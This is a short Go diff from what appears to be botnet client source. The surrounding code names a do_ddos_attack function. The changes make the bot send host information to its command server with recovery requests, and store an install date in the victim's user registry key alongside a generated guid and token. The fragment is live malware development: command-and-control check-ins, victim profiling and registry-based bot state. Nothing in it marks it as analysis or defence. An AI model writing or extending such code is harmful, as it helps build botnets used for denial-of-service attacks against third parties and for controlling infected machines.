@@ -22,7 +22,7 @@ func do_ddos_attack(pkg *ServerReply, host string) bool {
 
 func send_recover_request(host string) BotState {
 	url := build_url(host, "/recovery", botcore.use_ssl)
-	reply := do_head_post(url, nil, map[string]string{
+	reply := do_head_post(url, get_bot_info(), map[string]string{
 		"X-Guid": g_guid,
 		"X-Time": generate_utc_timestamp_string(),
 	}, botcore.use_ssl)
@@ -95,10 +95,15 @@ func auth_bot_poll(state BotState, host string) BotState {
 		g_guid = generate_guid()
 		if len(g_guid) > 0 {
 			if reg_create_or_update_value(registry.CURRENT_USER, g_regpath, "guid", g_guid, true) {
+				// Save installdate
+				g_installdate = generate_utc_timestamp_string()
+				reg_create_or_update_value(registry.CURRENT_USER, g_regpath, "installdate", g_installdate, true)
+
 				next_state = StateReadToken
 				break
 			}
 		}
+
 		next_state = StateGenGuid
 	case StateReadToken:
 		val := reg_read_key(registry.CURRENT_USER, g_regpath, "token", false)
